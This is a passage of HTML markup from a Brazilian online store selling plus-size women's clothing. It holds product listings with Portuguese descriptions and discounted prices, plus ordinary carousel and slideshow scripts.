            </a>
             
      </div>
      <div class="caption">
              
                <div class="name"><h4><a href="https://www.vickttoriavick.com.br/vestido-maisa-decote-vazado-plus-size">Vestido Maísa Decote Vazado Plus Size</a></h4></div>
                <div class="product_box_brand"><a href="https://www.vickttoriavick.com.br/vickttoria-vick">Vickttoria Vick</a></div>
                <p class="description">Vestido Maísa Decote Vazado

Vestido plus size em malha estampada com fundo areia. Decote vazado, recortes na frente, faixa lateral bicolor, zipper nas costas, mangas 3/4. Super confortável, elegant..</p>
                
                                
                                <p class="price">
                                    <span class="price-new">R$69,00</span> <span class="price-old">R$237,00</span>
                                  </p>
                                
                <div class="product-list-buttons">
                <div class="list-quickview">
                  <a class="btn btn-default quickview" href="https://www.vickttoriavick.com.br/vestido-maisa-decote-vazado-plus-size ?>">Vista Rápida</a>
                </div>
                <div class="cart">
                  <button type="button" onclick="cart.add('1243');" class="btn btn-primary">Comprar</button>
                </div>
                </div>
                
      </div>
    </div>
  </div>
      <div class="product-layout product-grid col-xs-12">
      <div class="product-thumb transition">
      <div class="image">       
            <span class="badge-wrapper">
            
            	
             
                        
                                    <span class="badge sale">-70%</span>
                              
            	
                                                            
            </span>
      
            <button type="button" data-toggle="tooltip" data-placement="left" title="Lista de desejos" onclick="wishlist.add('940');" class="wishlist"><i class="fa fa-heart"></i></button>
            <button type="button" data-toggle="tooltip" data-placement="left" title="Comparar" onclick="compare.add('940');" class="compare"><i class="fa fa-gavel"></i></button>
            <button type="button" data-toggle="tooltip" data-placement="left" title="Saia Vintage Plissada

Saia Plus Size, em musseline plissada estampada, com forro em cetim. Tem elástico no cós.&nbsp;Muito fofa e versátil esta saia, fica bem com uma básica de malha, fica bem com .." class="info"><i class="fa fa-info"></i></button>
      
            <div class="flybar">  
            <div class="flybar-quickview">
            <a class="btn btn-default quickview" href="https://www.vickttoriavick.com.br/saia-vintage-plissada-plus-size ?>">Vista Rápida</a>
            </div>
            <div class="flybar-cart">
            <button type="button" onclick="cart.add('940');" class="btn btn-primary">Comprar</button>  
            </div>   
            </div>
            
                        <a href="https://www.vickttoriavick.com.br/saia-vintage-plissada-plus-size">
            <img src="https://www.vickttoriavick.com.br/image/cache/catalog/produtos/saias-plus-size/saia-vintage-plissada-plus-size_940_1-32x32.jpg" data-original="https://www.vickttoriavick.com.br/image/cache/catalog/produtos/saias-plus-size/saia-vintage-plissada-plus-size_940_1-400x400.jpg" alt="Saia Vintage Plissada Plus Size" title="Saia Vintage Plissada Plus Size" width="400" height="400" class="img-responsive lazy-load  img-thumbnail-theme" />
            <img src="https://www.vickttoriavick.com.br/image/cache/catalog/produtos/saias-plus-size/saia-vintage-plissada-plus-size_940_1-32x32.jpg" data-original="https://www.vickttoriavick.com.br/image/cache/catalog/produtos/saias-plus-size/saia-vintage-plissada-plus-size_940_2-400x400.jpg" alt="Saia Vintage Plissada Plus Size" title="Saia Vintage Plissada Plus Size" width="400" height="400" class="img-responsive lazy-load  thumb_swap img-thumbnail-theme" />
            </a>
             
      </div>
      <div class="caption">
              
                <div class="name"><h4><a href="https://www.vickttoriavick.com.br/saia-vintage-plissada-plus-size">Saia Vintage Plissada Plus Size</a></h4></div>
                <div class="product_box_brand"><a href="https://www.vickttoriavick.com.br/vickttoria-vick">Vickttoria Vick</a></div>
                <p class="description">Saia Vintage Plissada

Saia Plus Size, em musseline plissada estampada, com forro em cetim. Tem elástico no cós.&nbsp;Muito fofa e versátil esta saia, fica bem com uma básica de malha, fica bem com ..</p>
                
                                
                                <p class="price">
                                    <span class="price-new">R$49,00</span> <span class="price-old">R$163,00</span>
                                  </p>
                                
                <div class="product-list-buttons">
                <div class="list-quickview">
                  <a class="btn btn-default quickview" href="https://www.vickttoriavick.com.br/saia-vintage-plissada-plus-size ?>">Vista Rápida</a>
                </div>
                <div class="cart">
                  <button type="button" onclick="cart.add('940');" class="btn btn-primary">Comprar</button>
                </div>
                </div>
                
      </div>
    </div>
  </div>
      <div class="product-layout product-grid col-xs-12">
      <div class="product-thumb transition">
      <div class="image">       
            <span class="badge-wrapper">
            
            	
             
                        
                                    <span class="badge sale">-69%</span>
                              
            	
                                                            
            </span>
      
            <button type="button" data-toggle="tooltip" data-placement="left" title="Lista de desejos" onclick="wishlist.add('1247');" class="wishlist"><i class="fa fa-heart"></i></button>
            <button type="button" data-toggle="tooltip" data-placement="left" title="Comparar" onclick="compare.add('1247');" class="compare"><i class="fa fa-gavel"></i></button>
            <button type="button" data-toggle="tooltip" data-placement="left" title="Vestido Peddy Pulle Irene

Vestido plus size, em crepe com bastante elastano estampado com fundo bege, decote careca&nbsp; com recortes no corpinho, costura na frente, faixas laterais bege e preta n.." class="info"><i class="fa fa-info"></i></button>
      
            <div class="flybar">  
            <div class="flybar-quickview">
            <a class="btn btn-default quickview" href="https://www.vickttoriavick.com.br/vestido-peddy-pulle-irene-plus-size ?>">Vista Rápida</a>
            </div>
            <div class="flybar-cart">
            <button type="button" onclick="cart.add('1247');" class="btn btn-primary">Comprar</button>  
            </div>   
            </div>
            
                        <a href="https://www.vickttoriavick.com.br/vestido-peddy-pulle-irene-plus-size">
            <img src="https://www.vickttoriavick.com.br/image/cache/catalog/produtos/vestidos-plus-size/vestido-peddy-pulle-irene-plus-size_1247_1-32x32.jpg" data-original="https://www.vickttoriavick.com.br/image/cache/catalog/produtos/vestidos-plus-size/vestido-peddy-pulle-irene-plus-size_1247_1-400x400.jpg" alt="Vestido Peddy Pulle Irene Plus Size" title="Vestido Peddy Pulle Irene Plus Size" width="400" height="400" class="img-responsive lazy-load  img-thumbnail-theme" />
            <img src="https://www.vickttoriavick.com.br/image/cache/catalog/produtos/vestidos-plus-size/vestido-peddy-pulle-irene-plus-size_1247_1-32x32.jpg" data-original="https://www.vickttoriavick.com.br/image/cache/catalog/produtos/vestidos-plus-size/vestido-peddy-pulle-irene-plus-size_1247_2-400x400.jpg" alt="Vestido Peddy Pulle Irene Plus Size" title="Vestido Peddy Pulle Irene Plus Size" width="400" height="400" class="img-responsive lazy-load  thumb_swap img-thumbnail-theme" />
            </a>
             
      </div>
      <div class="caption">
              
                <div class="name"><h4><a href="https://www.vickttoriavick.com.br/vestido-peddy-pulle-irene-plus-size">Vestido Peddy Pulle Irene Plus Size</a></h4></div>
                <div class="product_box_brand"><a href="https://www.vickttoriavick.com.br/vickttoria-vick">Vickttoria Vick</a></div>
                <p class="description">Vestido Peddy Pulle Irene

Vestido plus size, em crepe com bastante elastano estampado com fundo bege, decote careca&nbsp; com recortes no corpinho, costura na frente, faixas laterais bege e preta n..</p>
                
                                
                                <p class="price">
                                    <span class="price-new">R$79,00</span> <span class="price-old">R$257,00</span>
                                  </p>
                                
                <div class="product-list-buttons">
                <div class="list-quickview">
                  <a class="btn btn-default quickview" href="https://www.vickttoriavick.com.br/vestido-peddy-pulle-irene-plus-size ?>">Vista Rápida</a>
                </div>
                <div class="cart">
                  <button type="button" onclick="cart.add('1247');" class="btn btn-primary">Comprar</button>
                </div>
                </div>
                
      </div>
    </div>
  </div>
      <div class="product-layout product-grid col-xs-12">
      <div class="product-thumb transition">
      <div class="image">       
            <span class="badge-wrapper">
            
            	
             
                        
                                    <span class="badge sale">-68%</span>
                              
            	
                                                            
            </span>
      
            <button type="button" data-toggle="tooltip" data-placement="left" title="Lista de desejos" onclick="wishlist.add('1633');" class="wishlist"><i class="fa fa-heart"></i></button>
            <button type="button" data-toggle="tooltip" data-placement="left" title="Comparar" onclick="compare.add('1633');" class="compare"><i class="fa fa-gavel"></i></button>
            <button type="button" data-toggle="tooltip" data-placement="left" title="Vestido Japo EstampadoVestido plus size em seda estampado com fundo bege. Decote em V na frente, nas costas V com treliças de viés. Mangas japonesa. Vestido estilo reto. Comprimento na altura do joelh.." class="info"><i class="fa fa-info"></i></button>
      
            <div class="flybar">  
            <div class="flybar-quickview">
            <a class="btn btn-default quickview" href="https://www.vickttoriavick.com.br/vestido-japo-plus-size ?>">Vista Rápida</a>
            </div>
            <div class="flybar-cart">
            <button type="button" onclick="cart.add('1633');" class="btn btn-primary">Comprar</button>  
            </div>   
            </div>
            
                        <a href="https://www.vickttoriavick.com.br/vestido-japo-plus-size">
            <img src="https://www.vickttoriavick.com.br/image/cache/catalog/produtos/vestidos-plus-size/vestido-japo-plus-size_1633_1-32x32.jpg" data-original="https://www.vickttoriavick.com.br/image/cache/catalog/produtos/vestidos-plus-size/vestido-japo-plus-size_1633_1-400x400.jpg" alt="Vestido Japo Plus Size" title="Vestido Japo Plus Size" width="400" height="400" class="img-responsive lazy-load  img-thumbnail-theme" />
            <img src="https://www.vickttoriavick.com.br/image/cache/catalog/produtos/vestidos-plus-size/vestido-japo-plus-size_1633_1-32x32.jpg" data-original="https://www.vickttoriavick.com.br/image/cache/catalog/produtos/vestidos-plus-size/vestido-japo-plus-size_1633_2-400x400.jpg" alt="Vestido Japo Plus Size" title="Vestido Japo Plus Size" width="400" height="400" class="img-responsive lazy-load  thumb_swap img-thumbnail-theme" />
            </a>
             
      </div>
      <div class="caption">
              
                <div class="name"><h4><a href="https://www.vickttoriavick.com.br/vestido-japo-plus-size">Vestido Japo Plus Size</a></h4></div>
                <div class="product_box_brand"><a href="https://www.vickttoriavick.com.br/vickttoria-vick">Vickttoria Vick</a></div>
                <p class="description">Vestido Japo EstampadoVestido plus size em seda estampado com fundo bege. Decote em V na frente, nas costas V com treliças de viés. Mangas japonesa. Vestido estilo reto. Comprimento na altura do joelh..</p>
                
                                
                                <p class="price">
                                    <span class="price-new">R$59,00</span> <span class="price-old">R$187,00</span>
                                  </p>
                                
                <div class="product-list-buttons">
                <div class="list-quickview">
                  <a class="btn btn-default quickview" href="https://www.vickttoriavick.com.br/vestido-japo-plus-size ?>">Vista Rápida</a>
                </div>
                <div class="cart">
                  <button type="button" onclick="cart.add('1633');" class="btn btn-primary">Comprar</button>
                </div>
                </div>
                
      </div>
    </div>
  </div>
  </div>
  
<script type="text/javascript"><!--
$('#slider-special-0').owlCarousel({
	items: 4,
	singleItem: false,
	pagination: true,
	navigation: false,
	navigationText: ['<i class="fa fa-chevron-left fa-5x"></i>', '<i class="fa fa-chevron-right fa-5x"></i>']
});
--></script>
 </div>

<div id="tab-most-viewed-0" class="row product-items fade tab-pane">
<div id="slider-most-viewed-0">
      <div class="product-layout product-grid col-xs-12">
      <div class="product-thumb transition">
      <div class="image">       
            <span class="badge-wrapper">
            
            	
             
                              
            	
                                                            
            </span>
      
            <button type="button" data-toggle="tooltip" data-placement="left" title="Lista de desejos" onclick="wishlist.add('2115');" class="wishlist"><i class="fa fa-heart"></i></button>
            <button type="button" data-toggle="tooltip" data-placement="left" title="Comparar" onclick="compare.add('2115');" class="compare"><i class="fa fa-gavel"></i></button>
            <button type="button" data-toggle="tooltip" data-placement="left" title="Camisa Zipper LendaCamisa plus size em crepom branco. Gola e pé de gola. Zipper no comprimento da blusa. Manga 3/4. Pêncis pespontadas frente e costa. Tem um excelente caimento. Tecido não amassa.Marc.." class="info"><i class="fa fa-info"></i></button>
      
            <div class="flybar">  
            <div class="flybar-quickview">
            <a class="btn btn-default quickview" href="https://www.vickttoriavick.com.br/camisa-zipper-lenda-branco-plus-size ?>">Vista Rápida</a>
            </div>
            <div class="flybar-cart">
            <button type="button" onclick="cart.add('2115');" class="btn btn-primary">Comprar</button>  
            </div>   
            </div>
            
                        <a href="https://www.vickttoriavick.com.br/camisa-zipper-lenda-branco-plus-size">
            <img src="https://www.vickttoriavick.com.br/image/cache/catalog/produtos/camisa-plus-size/camisa-zipper-lenda-branco-plus-size_2115_1-32x32.jpg" data-original="https://www.vickttoriavick.com.br/image/cache/catalog/produtos/camisa-plus-size/camisa-zipper-lenda-branco-plus-size_2115_1-400x400.jpg" alt="Camisa Zipper Lenda Branco Plus Size" title="Camisa Zipper Lenda Branco Plus Size" width="400" height="400" class="img-responsive lazy-load  img-thumbnail-theme" />
            <img src="https://www.vickttoriavick.com.br/image/cache/catalog/produtos/camisa-plus-size/camisa-zipper-lenda-branco-plus-size_2115_1-32x32.jpg" data-original="https://www.vickttoriavick.com.br/image/cache/catalog/produtos/camisa-plus-size/camisa-zipper-lenda-branco-plus-size_2115_2-400x400.jpg" alt="Camisa Zipper Lenda Branco Plus Size" title="Camisa Zipper Lenda Branco Plus Size" width="400" height="400" class="img-responsive lazy-load  thumb_swap img-thumbnail-theme" />
            </a>
             
      </div>
      <div class="caption">
              
                <div class="name"><h4><a href="https://www.vickttoriavick.com.br/camisa-zipper-lenda-branco-plus-size">Camisa Zipper Lenda Branco Plus Size</a></h4></div>
                <div class="product_box_brand"><a href="https://www.vickttoriavick.com.br/vickttoria-vick">Vickttoria Vick</a></div>
                <p class="description">Camisa Zipper LendaCamisa plus size em crepom branco. Gola e pé de gola. Zipper no comprimento da blusa. Manga 3/4. Pêncis pespontadas frente e costa. Tem um excelente caimento. Tecido não amassa.Marc..</p>
                
                                
                                <p class="price">
                   
                  R$178,00
                                  </p>
                                
                <div class="product-list-buttons">
                <div class="list-quickview">
                  <a class="btn btn-default quickview" href="https://www.vickttoriavick.com.br/camisa-zipper-lenda-branco-plus-size ?>">Vista Rápida</a>
                </div>
                <div class="cart">
                  <button type="button" onclick="cart.add('2115');" class="btn btn-primary">Comprar</button>
                </div>
                </div>
                
      </div>
    </div>
  </div>
      <div class="product-layout product-grid col-xs-12">
      <div class="product-thumb transition">
      <div class="image">       
            <span class="badge-wrapper">
            
            	
             
                              
            	
                                                            
            </span>
      
            <button type="button" data-toggle="tooltip" data-placement="left" title="Lista de desejos" onclick="wishlist.add('2128');" class="wishlist"><i class="fa fa-heart"></i></button>
            <button type="button" data-toggle="tooltip" data-placement="left" title="Comparar" onclick="compare.add('2128');" class="compare"><i class="fa fa-gavel"></i></button>
            <button type="button" data-toggle="tooltip" data-placement="left" title="Camisa VitóriaCamisa plus size em viscose estampada. Decote careca. Aberta na frente, com detalhe de pequeno jabôo na lateral do abotoamento. Apenas um bolso grande na frente, Mangas 3/4 com detalhe d.." class="info"><i class="fa fa-info"></i></button>
      
            <div class="flybar">  
            <div class="flybar-quickview">
            <a class="btn btn-default quickview" href="https://www.vickttoriavick.com.br/camisa-vitoria-plus-size ?>">Vista Rápida</a>
            </div>
            <div class="flybar-cart">
            <button type="button" onclick="cart.add('2128');" class="btn btn-primary">Comprar</button>  
            </div>   
            </div>
            
                        <a href="https://www.vickttoriavick.com.br/camisa-vitoria-plus-size">
            <img src="https://www.vickttoriavick.com.br/image/cache/catalog/produtos/camisa-plus-size/camisa-vitoria-plus-size_2128_1-32x32.jpg" data-original="https://www.vickttoriavick.com.br/image/cache/catalog/produtos/camisa-plus-size/camisa-vitoria-plus-size_2128_1-400x400.jpg" alt="Camisa Vitória Plus Size" title="Camisa Vitória Plus Size" width="400" height="400" class="img-responsive lazy-load  img-thumbnail-theme" />
            <img src="https://www.vickttoriavick.com.br/image/cache/catalog/produtos/camisa-plus-size/camisa-vitoria-plus-size_2128_1-32x32.jpg" data-original="https://www.vickttoriavick.com.br/image/cache/catalog/produtos/camisa-plus-size/camisa-vitoria-plus-size_2128_2-400x400.jpg" alt="Camisa Vitória Plus Size" title="Camisa Vitória Plus Size" width="400" height="400" class="img-responsive lazy-load  thumb_swap img-thumbnail-theme" />
            </a>
             
      </div>
      <div class="caption">
              
                <div class="name"><h4><a href="https://www.vickttoriavick.com.br/camisa-vitoria-plus-size">Camisa Vitória Plus Size</a></h4></div>
                <div class="product_box_brand"><a href="https://www.vickttoriavick.com.br/vickttoria-vick">Vickttoria Vick</a></div>
                <p class="description">Camisa VitóriaCamisa plus size em viscose estampada. Decote careca. Aberta na frente, com detalhe de pequeno jabôo na lateral do abotoamento. Apenas um bolso grande na frente, Mangas 3/4 com detalhe d..</p>
                
                                
                                <p class="price">
                   
                  R$171,00
                                  </p>
                                
                <div class="product-list-buttons">
                <div class="list-quickview">
                  <a class="btn btn-default quickview" href="https://www.vickttoriavick.com.br/camisa-vitoria-plus-size ?>">Vista Rápida</a>
                </div>
                <div class="cart">
                  <button type="button" onclick="cart.add('2128');" class="btn btn-primary">Comprar</button>
                </div>
                </div>
                
      </div>
    </div>
  </div>
      <div class="product-layout product-grid col-xs-12">
      <div class="product-thumb transition">
      <div class="image">       
            <span class="badge-wrapper">
            
            	
             
                              
            	
                                                            
            </span>
      
            <button type="button" data-toggle="tooltip" data-placement="left" title="Lista de desejos" onclick="wishlist.add('2127');" class="wishlist"><i class="fa fa-heart"></i></button>
            <button type="button" data-toggle="tooltip" data-placement="left" title="Comparar" onclick="compare.add('2127');" class="compare"><i class="fa fa-gavel"></i></button>
            <button type="button" data-toggle="tooltip" data-placement="left" title="Camisa SofiaCamisa plus size em sedinha de estampa animal print. Gola e pé de gola. Detalhe de ajhur&nbsp; preto na frente. Aberta na frente. Mangas 3/4 com detalhe de drapeado no meio da manga. Simpl.." class="info"><i class="fa fa-info"></i></button>
      
            <div class="flybar">  
            <div class="flybar-quickview">
            <a class="btn btn-default quickview" href="https://www.vickttoriavick.com.br/camisa-sofia-plus-size ?>">Vista Rápida</a>
            </div>
            <div class="flybar-cart">
            <button type="button" onclick="cart.add('2127');" class="btn btn-primary">Comprar</button>  
            </div>   
            </div>
            
                        <a href="https://www.vickttoriavick.com.br/camisa-sofia-plus-size">
            <img src="https://www.vickttoriavick.com.br/image/cache/catalog/produtos/camisa-plus-size/camisa-sofia-plus-size_2127_1-32x32.jpg" data-original="https://www.vickttoriavick.com.br/image/cache/catalog/produtos/camisa-plus-size/camisa-sofia-plus-size_2127_1-400x400.jpg" alt="Camisa Sofia Plus Size" title="Camisa Sofia Plus Size" width="400" height="400" class="img-responsive lazy-load  img-thumbnail-theme" />
            <img src="https://www.vickttoriavick.com.br/image/cache/catalog/produtos/camisa-plus-size/camisa-sofia-plus-size_2127_1-32x32.jpg" data-original="https://www.vickttoriavick.com.br/image/cache/catalog/produtos/camisa-plus-size/camisa-sofia-plus-size_2127_2-400x400.jpg" alt="Camisa Sofia Plus Size" title="Camisa Sofia Plus Size" width="400" height="400" class="img-responsive lazy-load  thumb_swap img-thumbnail-theme" />
            </a>
             
      </div>
      <div class="caption">
              
                <div class="name"><h4><a href="https://www.vickttoriavick.com.br/camisa-sofia-plus-size">Camisa Sofia Plus Size</a></h4></div>
                <div class="product_box_brand"><a href="https://www.vickttoriavick.com.br/vickttoria-vick">Vickttoria Vick</a></div>
                <p class="description">Camisa SofiaCamisa plus size em sedinha de estampa animal print. Gola e pé de gola. Detalhe de ajhur&nbsp; preto na frente. Aberta na frente. Mangas 3/4 com detalhe de drapeado no meio da manga. Simpl..</p>
                
                                
                                <p class="price">
                   
                  R$163,00
                                  </p>
                                
                <div class="product-list-buttons">
                <div class="list-quickview">
                  <a class="btn btn-default quickview" href="https://www.vickttoriavick.com.br/camisa-sofia-plus-size ?>">Vista Rápida</a>
                </div>
                <div class="cart">
                  <button type="button" onclick="cart.add('2127');" class="btn btn-primary">Comprar</button>
                </div>
                </div>
                
      </div>
    </div>
  </div>
      <div class="product-layout product-grid col-xs-12">
      <div class="product-thumb transition">
      <div class="image">       
            <span class="badge-wrapper">
            
            	
             
                        
                                    <span class="badge sale">-68%</span>
                              
            	
                                                            
            </span>
      
            <button type="button" data-toggle="tooltip" data-placement="left" title="Lista de desejos" onclick="wishlist.add('910');" class="wishlist"><i class="fa fa-heart"></i></button>
            <button type="button" data-toggle="tooltip" data-placement="left" title="Comparar" onclick="compare.add('910');" class="compare"><i class="fa fa-gavel"></i></button>
            <button type="button" data-toggle="tooltip" data-placement="left" title="Vestido Renda Bordô Forrado Ouro&nbsp;

Vestido plus size renda bordô, forrado com cetim cor caramelo, pala frente e costa sem forro, zipper na costa, mangas 3/4, recortes na frente e costa, decote .." class="info"><i class="fa fa-info"></i></button>
      
            <div class="flybar">  
            <div class="flybar-quickview">
            <a class="btn btn-default quickview" href="https://www.vickttoriavick.com.br/vestido-renda-ouro-plus-size-910 ?>">Vista Rápida</a>
            </div>
            <div class="flybar-cart">
            <button type="button" onclick="cart.add('910');" class="btn btn-primary">Comprar</button>  
            </div>   
            </div>
            
                        <a href="https://www.vickttoriavick.com.br/vestido-renda-ouro-plus-size-910">
            <img src="https://www.vickttoriavick.com.br/image/cache/catalog/produtos/vestidos-plus-size/vestido-renda-ouro-plus-size_910_1-32x32.jpg" data-original="https://www.vickttoriavick.com.br/image/cache/catalog/produtos/vestidos-plus-size/vestido-renda-ouro-plus-size_910_1-400x400.jpg" alt="Vestido Renda Ouro Plus Size" title="Vestido Renda Ouro Plus Size" width="400" height="400" class="img-responsive lazy-load  img-thumbnail-theme" />
            <img src="https://www.vickttoriavick.com.br/image/cache/catalog/produtos/vestidos-plus-size/vestido-renda-ouro-plus-size_910_1-32x32.jpg" data-original="https://www.vickttoriavick.com.br/image/cache/catalog/produtos/vestidos-plus-size/vestido-renda-ouro-plus-size_910_2-400x400.jpg" alt="Vestido Renda Ouro Plus Size" title="Vestido Renda Ouro Plus Size" width="400" height="400" class="img-responsive lazy-load  thumb_swap img-thumbnail-theme" />
            </a>
             
      </div>
      <div class="caption">
              
                <div class="name"><h4><a href="https://www.vickttoriavick.com.br/vestido-renda-ouro-plus-size-910">Vestido Renda Ouro Plus Size</a></h4></div>
                <div class="product_box_brand"><a href="https://www.vickttoriavick.com.br/vickttoria-vick">Vickttoria Vick</a></div>
                <p class="description">Vestido Renda Bordô Forrado Ouro&nbsp;

Vestido plus size renda bordô, forrado com cetim cor caramelo, pala frente e costa sem forro, zipper na costa, mangas 3/4, recortes na frente e costa, decote ..</p>
                
                                
                                <p class="price">
                                    <span class="price-new">R$89,00</span> <span class="price-old">R$279,00</span>
                                  </p>
                                
                <div class="product-list-buttons">
                <div class="list-quickview">
                  <a class="btn btn-default quickview" href="https://www.vickttoriavick.com.br/vestido-renda-ouro-plus-size-910 ?>">Vista Rápida</a>
                </div>
                <div class="cart">
                  <button type="button" onclick="cart.add('910');" class="btn btn-primary">Comprar</button>
                </div>
                </div>
                
      </div>
    </div>
  </div>
  </div>
  
<script type="text/javascript"><!--
$('#slider-most-viewed-0').owlCarousel({
	itemsCustom : [
        [0, 1],
        [980, '4'],
    ],
	singleItem: false,
	pagination: true,
	navigation: false,
	navigationText: ['<i class="fa fa-chevron-left fa-5x"></i>', '<i class="fa fa-chevron-right fa-5x"></i>']
});
--></script>
 
 </div>

</div>
</div>
</div>
</div>
<div id="product-slider">
                <div id="ei-slider" class="ei-slider">
                    <ul class="ei-slider-large">
                    						<li>
                                                    <div class="image" ><a href="https://www.vickttoriavick.com.br/vestido-veludo-lana-plus-size"><img src="https://www.vickttoriavick.com.br/image/cache/catalog/produtos/vestidos-plus-size/vestido-veludo-lana-plus-size_1984_1-24x30.jpg" class="lazy-load" data-original="https://www.vickttoriavick.com.br/image/cache/catalog/produtos/vestidos-plus-size/vestido-veludo-lana-plus-size_1984_1-300x300.jpg" width="300" height="300" alt="Vestido Veludo Lana Plus Size" /></a></div>
                                                    <div class="ei-title">
                                <h2><a href="https://www.vickttoriavick.com.br/vestido-veludo-lana-plus-size">Vestido Veludo Lana Plus Size</a></h2>
                                <h3><a href="https://www.vickttoriavick.com.br/vestido-veludo-lana-plus-size">Vestido Veludo LanaVestido curto plus size em veludo preto bordado. Estilo falsa cachiquer. decote em V. Mangas 3/4. Zipper atrás. Um luxo este vestido. Quê bordado! Muito vintage!Marca VICKTTORIA VIC..</a></h3>                                
                                <h4><a href="https://www.vickttoriavick.com.br/vestido-veludo-lana-plus-size">
                                                                R$303,00
                                                                </a>
                                <br /><br /><br />
                                <a href="https://www.vickttoriavick.com.br/vestido-veludo-lana-plus-size" class="btn btn-primary hidden-xs hidden-sm">Comprar agora!</a>
                                </h4>
                            </div>
                        </li>
                    						<li>
                                                    <div class="image" ><a href="https://www.vickttoriavick.com.br/blusa-aretha-branca-plus-size"><img src="https://www.vickttoriavick.com.br/image/cache/catalog/produtos/blusa-plus-size/blusa-aretha-branca-plus-size_1710_1-24x30.jpg" class="lazy-load" data-original="https://www.vickttoriavick.com.br/image/cache/catalog/produtos/blusa-plus-size/blusa-aretha-branca-plus-size_1710_1-300x300.jpg" width="300" height="300" alt="Blusa Aretha Branca Plus Size" /></a></div>
                                                    <div class="ei-title">
                                <h2><a href="https://www.vickttoriavick.com.br/blusa-aretha-branca-plus-size">Blusa Aretha Branca Plus Size</a></h2>
                                <h3><a href="https://www.vickttoriavick.com.br/blusa-aretha-branca-plus-size">Blusa Aretha BrancaBlusa plus size em crepom branco. Decote semi canoa, contornado por detalhe do mesmo tecido na forma de trança. Recortes na frente pespontado. Mangas 3/4 com recortes também pespont..</a></h3>                                
                                <h4><a href="https://www.vickttoriavick.com.br/blusa-aretha-branca-plus-size">
                                                                R$179,00
                                                                </a>
                                <br /><br /><br />
                                <a href="https://www.vickttoriavick.com.br/blusa-aretha-branca-plus-size" class="btn btn-primary hidden-xs hidden-sm">Comprar agora!</a>
                                </h4>
                            </div>
                        </li>
                    						<li>
                                                    <div class="image" ><a href="https://www.vickttoriavick.com.br/colete-jhon-plus-size"><img src="https://www.vickttoriavick.com.br/image/cache/catalog/produtos/camisa-plus-size/colete-jhon-plus-size_1940_1-24x30.jpg" class="lazy-load" data-original="https://www.vickttoriavick.com.br/image/cache/catalog/produtos/camisa-plus-size/colete-jhon-plus-size_1940_1-300x300.jpg" width="300" height="300" alt="Colete Jhon Plus Size" /></a></div>
                                                    <div class="ei-title">
                                <h2><a href="https://www.vickttoriavick.com.br/colete-jhon-plus-size">Colete Jhon Plus Size</a></h2>
                                <h3><a href="https://www.vickttoriavick.com.br/colete-jhon-plus-size">Colete Jhon PretoColete plus size, em neoprene. Gola de blazer, sem acabamento. Recortes na frente sem acabamento. Pêncis atrás. Super básico, leve. Fácil de usar e combinar.Marca VICKTTORIA VICK Plus..</a></h3>                                
                                <h4><a href="https://www.vickttoriavick.com.br/colete-jhon-plus-size">
                                                                R$188,00
                                                                </a>
                                <br /><br /><br />
                                <a href="https://www.vickttoriavick.com.br/colete-jhon-plus-size" class="btn btn-primary hidden-xs hidden-sm">Comprar agora!</a>
                                </h4>
                            </div>
                        </li>
                      
                    </ul>
                    <ul class="ei-slider-thumbs">
                        <li class="ei-slider-element">Current</li>
                    						<li><a href="#"></a><img src="https://www.vickttoriavick.com.br/image/cache/catalog/produtos/vestidos-plus-size/vestido-veludo-lana-plus-size_1984_1-24x30.jpg" class="lazy-load" data-original="https://www.vickttoriavick.com.br/image/cache/catalog/produtos/vestidos-plus-size/vestido-veludo-lana-plus-size_1984_1-300x300.jpg" width="300" height="300" alt="Vestido Veludo Lana Plus Size" /><div class="thumb_arrow"></div></li>
                    						<li><a href="#"></a><img src="https://www.vickttoriavick.com.br/image/cache/catalog/produtos/blusa-plus-size/blusa-aretha-branca-plus-size_1710_1-24x30.jpg" class="lazy-load" data-original="https://www.vickttoriavick.com.br/image/cache/catalog/produtos/blusa-plus-size/blusa-aretha-branca-plus-size_1710_1-300x300.jpg" width="300" height="300" alt="Blusa Aretha Branca Plus Size" /><div class="thumb_arrow"></div></li>
                    						<li><a href="#"></a><img src="https://www.vickttoriavick.com.br/image/cache/catalog/produtos/camisa-plus-size/colete-jhon-plus-size_1940_1-24x30.jpg" class="lazy-load" data-original="https://www.vickttoriavick.com.br/image/cache/catalog/produtos/camisa-plus-size/colete-jhon-plus-size_1940_1-300x300.jpg" width="300" height="300" alt="Colete Jhon Plus Size" /><div class="thumb_arrow"></div></li>
                     
                    </ul>
                </div>
</div>
        <link rel="stylesheet" type="text/css" href="catalog/view/theme/uptheme/stylesheet/elastic_slideshow.css" />
        <script type="text/javascript" src="catalog/view/theme/uptheme/js/jquery.eislideshow.js"></script>
        <script type="text/javascript">
            $(function() {
                $('#ei-slider').eislideshow({
					autoplay			: true,
					slideshow_interval	: 5000,
					titlesFactor		: 0
                });
                                
                    maxHeight = 0 ; 
                    $('.ei-slider .ei-title').each(function(){ maxHeight = Math.max(maxHeight,$(this).height()); }); 
                    $('.ei-slider').css('height',(maxHeight + 65));
                
            });
        </script>
<div id="up_theme_banner2" class="panel panel-default up-theme-banner">
      <div class="pr2 col-sm-4 up-theme-banner-item slide-0">
  <a href="https://www.vickttoriavick.com.br/moda-plus-size/vestidos-plus-size">
  <img src="https://www.vickttoriavick.com.br/image/cache/catalog/banners-2021/bas1-300x150.jpg" class="lazy-load" data-original="https://www.vickttoriavick.com.br/image/cache/catalog/banners-2021/bas1-900x450.jpg" width="900" height="450" alt="Vestidos Plus Size" title="Vestidos Plus Size" />
  <span class="up-theme-banner-bg"></span>
  <span class="up-theme-banner-title"><h2>Vestidos Plus Size</h2></span>
  </a>
  </div>
        <div class="pr2 col-sm-4 up-theme-banner-item slide-0">
  <a href="https://www.vickttoriavick.com.br/moda-plus-size/camisa-plus-size">
  <img src="https://www.vickttoriavick.com.br/image/cache/catalog/banners-2021/bas2-300x150.jpg" class="lazy-load" data-original="https://www.vickttoriavick.com.br/image/cache/catalog/banners-2021/bas2-900x450.jpg" width="900" height="450" alt="Camisas Plus Size" title="Camisas Plus Size" />
  <span class="up-theme-banner-bg"></span>
  <span class="up-theme-banner-title"><h2>Camisas Plus Size</h2></span>
  </a>
  </div>
    </div>
<div id="pavpopup_" data-id="" class="hide" data-time-close="12" data-time-open="10" data-text-close="Isso será fechado em %s" data-display="alway_show_close">
  <div class="pavpopup-inner white-popup" style="position: relative; background: #FFF; padding: 20px;width: auto;max-width:600px; margin: 20px auto;">
      <div class="popup-content-top">          <div class="popup-content"><p><a href="https://www.vickttoriavick.com.br/criar-conta" target="_self">
<img data-src="https://www.vickttoriavick.com.br/image/catalog/banner-2019/popup.jpg">
</a>
